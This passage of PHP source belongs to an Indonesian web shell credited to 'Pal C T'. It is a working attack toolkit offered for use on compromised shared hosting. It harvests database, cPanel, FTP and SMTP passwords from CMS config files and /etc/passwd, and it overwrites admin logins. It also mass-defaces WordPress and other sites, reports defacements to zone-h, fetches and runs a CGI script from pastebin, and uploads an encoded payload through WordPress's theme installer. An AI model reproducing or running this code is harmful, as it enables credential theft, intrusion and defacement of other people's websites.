                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain </font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain </font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain </font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain /', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='PalCT' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='PalCT' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
        </form>
        <span>NB: jalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
} elseif($_GET['do'] == 'cpanel') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                         
                        } else {
                            $i++;
                            if(function_exists('posix_getpwuid')) {
                                $domain_cp = file_get_contents("/etc/named.conf");
                                if($domain_cp == '') {
                                    $dom =  "<font color=red>gabisa ambil nama domain </font>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                    foreach($domains_cp[1] as $dj) {
                                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_cp_url = $user_cp_url['name'];
                                        if($user_cp_url == $ucp) {
                                            $dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                $dom = "<font color=red>function is Disable by system</font>";
                            }
                            echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses ".$i." Cpanel by <font color=lime>Pal C T.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/client/", $ambil)) {
                    preg_match("/password=(.*)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'cpftp_auto') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                            //
                        } else {
                            echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                            $ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
                            $ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
                            if((!$ftp_login) || (!$ftp_conn)) {
                                echo "[+] <font color=red>Login Gagal</font><br><br>";
                            } else {
                                echo "[+] <font color=lime>Login Sukses</font><br>";
                                $fi = htmlspecialchars($_POST['file_deface']);
                                $deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
                                if($deface) {
                                    $i++;
                                    echo "[+] <font color=lime>Deface Sukses</font><br>";
                                    if(function_exists('posix_getpwuid')) {
                                        $domain_cp = file_get_contents("/etc/named.conf");
                                        if($domain_cp == '') {
                                            echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                        } else {
                                            preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                            foreach($domains_cp[1] as $dj) {
                                                $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                                $user_cp_url = $user_cp_url['name'];
                                                if($user_cp_url == $ucp) {
                                                    echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
                                                    break;
                                                }
                                            }
                                        }
                                    } else {
                                        echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
                                    }
                                } else {
                                    echo "[-] <font color=red>Deface Gagal</font><br><br>";
                                }
                            }
                            //echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses ".$i." Cpanel by <font color=lime>Pal C T.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        Filename: <br>
        <input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
        Deface Page: <br>
        <input type='text' name='deface' placeholder='http://target.com/filemu.php' style='width: 450px;'><br>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/client/", $ambil)) {
                    preg_match("/password=(.*)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='submit'>
        </form>
        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'smtp') {
    echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
    function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            $ambil = str_replace("$", "", $ambil);
            if(preg_match("/JConfig|joomla/", $ambil)) {
                $smtp_host = ambilkata($ambil,"smtphost = '","'");
                $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                $smtp_port = ambilkata($ambil,"smtpport = '","'");
                $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
                echo "SMTP port: <font color=lime>$smtp_port</font><br>";
                echo "SMTP user: <font color=lime>$smtp_user</font><br>";
                echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
                echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
                echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
            }
        }
    }
    $smpt_hunter = scj($dir);
    echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
    if($_POST['hajar']) {
        $title = htmlspecialchars($_POST['new_title']);
        $pn_title = str_replace(" ", "-", $title);
        if($_POST['cek_edit'] == "Y") {
            $script = $_POST['edit_content'];
        } else {
            $script = $title;
        }
        $conf = $_POST['config_dir'];
        $scan_conf = scandir($conf);
        foreach($scan_conf as $file_conf) {
            if(!is_file("$conf/$file_conf")) continue;
            $config = file_get_contents("$conf/$file_conf");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit Title+Content WordPress</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Pal C T' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
} elseif($_GET['do'] == 'zoneh') {
    if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='./Chu404'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
} elseif($_GET['do'] == 'cgi') {
    $cgi_dir = mkdir('idx_cgi', 0755);
    $file_cgi = "idx_cgi/cgi.izo";
    $isi_htcgi = "AddHandler cgi-script .izo";
    $htcgi = fopen(".htaccess", "w");
    $cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
    $cgi = fopen($file_cgi, "w");
    fwrite($cgi, $cgi_script);
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
    echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
    ob_start();
    function reverse($url) {
        $ch = curl_init("http://domains.yougetsignal.com/domains.php");
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
              curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
              curl_setopt($ch, CURLOPT_HEADER, 0);
              curl_setopt($ch, CURLOPT_POST, 1);
        $resp = curl_exec($ch);
        $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
        $array = explode(",,", $resp);
        unset($array[0]);
        foreach($array as $lnk) {
            $lnk = "http://$lnk";
            $lnk = str_replace(",", "", $lnk);
            echo $lnk."\n";
            ob_flush();
            flush();
        }
              curl_close($ch);
    }
    function cek($url) {
        $ch = curl_init($url);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $resp = curl_exec($ch);
        return $resp;
    }
    $cwd = getcwd();
    $ambil_user = explode("/", $cwd);
    $user = $ambil_user[2];
    if($_POST['reverse']) {
        $site = explode("\r\n", $_POST['url']);
        $file = $_POST['file'];
        foreach($site as $url) {
            $cek = cek("$url/~$user/$file");
            if(preg_match("/hacked/i", $cek)) {
                echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
        User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
        Domain: <br>
        <textarea style='width: 450px; height: 250px;' name='url'>";
        reverse($_SERVER['HTTP_HOST']);
        echo "</textarea><br>
        <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
        </form><br>
        NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
    }
} elseif($_GET['do'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
              curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if(file_exists('adminer.php')) {
        echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
    } else {
        if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
            echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
            echo "<center><font color=red>gagal buat file adminer</font></center>";
        }
    }
} elseif($_GET['do'] == 'auto_dwp') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $scan = $_POST['link_config'];
        $link_config = scandir($scan);
        $script = htmlspecialchars($_POST['script']);
        $user = "PALCT";
        $pass = "PALCT";
        $passx = md5($pass);
        foreach($link_config as $dir_config) {
            if(!is_file("$scan/$dir_config")) continue;
            $config = file_get_contents("$scan/$dir_config");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {              
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                    $upload3 = base64_decode("Z2FudGVuZw0KPDByFzdUTB57rSCNByzWB6ZAyCNHQU8hvg8gWZ5Yjx07DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLPWKtcPjpxQzc26CxTB57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84D57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84D57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84D57rH1gziT2N29TKr4Lc6JaMEvSpE8Gxvy84DPFuQMNfm2RfEHfK0KDQo/Pg==");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=lime>$user</font><br>";
                        echo "[+] password: <font color=lime>$pass</font><br><br>";  
                        }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface</h1>
        <form method='post'>
        <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
        <input type='text' name='script' height='10' size='50' placeholder='Pal C T' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form>
        <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
        </center>";
    }
} elseif($_GET['do'] == 'auto_dwp2') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
